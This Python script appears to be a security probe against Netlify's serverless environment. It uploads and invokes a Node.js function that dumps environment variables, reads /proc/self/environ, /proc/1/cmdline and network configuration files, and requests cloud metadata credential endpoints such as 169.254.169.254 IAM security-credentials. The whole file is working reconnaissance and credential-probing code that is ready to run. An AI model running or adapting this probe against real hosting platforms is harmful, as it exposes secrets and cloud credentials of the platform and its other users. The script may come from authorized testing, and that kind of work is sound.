# -*- coding: utf-8 -*-
"""Netlify:probe2 增强探测 - 完整 env 键名/网络/fs/AWS 连通性
流程:创建 deploy -> 上传 probe2 -> publish -> invoke
"""
import http.client, ssl, gzip, brotli, sys, json, zipfile, io
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, SITE_A

ctx = ssl.create_default_context()

def api(path, method='GET', body=None, raw_body=None, ctype='application/json', qs=''):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=60)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip', 'Accept': 'application/json',
         'Authorization': 'Bearer ' + TOKEN_A, 'Content-Type': ctype}
    payload = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn.request(method, path + qs, body=payload, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

FN_CODE = r'''const fs = require('fs');
const os = require('os');
exports.handler = async () => {
  const out = { env: [], hosts: '', resolv: '', ifaces: {}, fs: {}, aws: [], netlifyTry: [] };
  out.env = Object.keys(process.env).map((k) => {
    const v = process.env[k] || '';
    return k + '=' + (v.length > 80 ? v.slice(0, 30) + '..len' + v.length : v);
  });
  try { out.hosts = fs.readFileSync('/etc/hosts', 'utf8'); } catch (e) { out.hosts = 'ERR ' + e; }
  try { out.resolv = fs.readFileSync('/etc/resolv.conf', 'utf8'); } catch (e) {}
  try {
    const ifs = os.networkInterfaces();
    const brief = {};
    for (const k of Object.keys(ifs)) brief[k] = (ifs[k] || []).map((i) => i.address + '/' + i.netmask + (i.internal ? '(lo)' : ''));
    out.ifaces = brief;
  } catch (e) { out.ifacesErr = String(e); }
  const rd = (p) => { try { return fs.readdirSync(p); } catch (e) { return 'ERR ' + String(e).slice(0, 60); } };
  out.fs.cwd = process.cwd();
  out.fs.home = os.homedir();
  out.fs.varTask = rd('/var/task');
  out.fs.opt = rd('/opt');
  out.fs.tmp = rd('/tmp').slice(0, 20);
  try { out.fs.proc1Cmd = fs.readFileSync('/proc/1/cmdline', 'utf8').replace(/\0/g, ' '); } catch (e) {}
  try { out.fs.mounts = fs.readFileSync('/proc/self/mountinfo', 'utf8').split('\n').slice(0, 40); } catch (e) {}
  try { out.fs.procEnviron = (fs.readFileSync('/proc/self/environ', 'utf8') || '').replace(/\0/g, '|').slice(0, 600); } catch (e) {}
  // AWS 端点连通性
  for (const u of [
    'https://sts.us-east-2.amazonaws.com/',
    'https://lambda.us-east-2.amazonaws.com/',
    'https://s3.us-east-2.amazonaws.com/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.170.2/v2/credentials',
  ]) {
    try {
      const ctl = new AbortController();
      const t = setTimeout(() => ctl.abort(), 3000);
      const r = await fetch(u, { signal: ctl.signal });
      clearTimeout(t);
      out.aws.push(u + ' => ' + r.status + ' len=' + (await r.text()).length);
    } catch (e) { out.aws.push(u + ' => ERR ' + String(e).slice(0, 80)); }
  }
  return { statusCode: 200, body: JSON.stringify(out) };
};
'''

# 1. zip 创建 deploy(含 index.html + netlify/functions/probe2/index.js)
site_buf = io.BytesIO()
with zipfile.ZipFile(site_buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.html', '<html><body>fn probe2</body></html>')
    z.writestr('netlify/functions/probe2/index.js', FN_CODE)
site_zip = site_buf.getvalue()
s, raw = api('/api/v1/sites/%s/deploys' % SITE_A, method='POST', raw_body=site_zip, ctype='application/zip')
print('create deploy(zip):', s, raw[:300].decode('utf-8', 'ignore').replace('\n', ' '))
d = json.loads(raw)
DID = d.get('id')
print('deploy id:', DID, 'state:', d.get('state'))
print('required_functions:', d.get('required_functions'))
print('functions:', json.dumps(d.get('functions'))[:300])
print('summary:', json.dumps(d.get('summary'))[:200])

# 2. zip 打包函数(备用:若需 uploadDeployFunction 补充)
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.js', FN_CODE)
zb = buf.getvalue()
print('fn zip size:', len(zb))

# 3. 发布
s, raw = api('/api/v1/sites/%s/deploys/%s' % (SITE_A, DID), method='PUT', body={'state': 'published'})
print('publish:', s, raw[:150].decode('utf-8', 'ignore').replace('\n', ' '))
dd = json.loads(raw) if s == 200 else {}
print('published state:', dd.get('state'), 'functions:', json.dumps(dd.get('functions'))[:300])

# 4. 调用
try:
    conn = http.client.HTTPSConnection('sec-test-rcf6lz.netlify.app', context=ctx, timeout=90)
    conn.request('GET', '/.netlify/functions/probe2')
    r = conn.getresponse()
    b = r.read()
    print('invoke status:', r.status, 'len:', len(b))
    try:
        dd = json.loads(b)
        print(json.dumps(dd, indent=1, ensure_ascii=False)[:6000])
    except Exception:
        print(b[:3000].decode('utf-8', 'ignore'))
    conn.close()
except Exception as e:
    print('invoke err:', str(e)[:200])
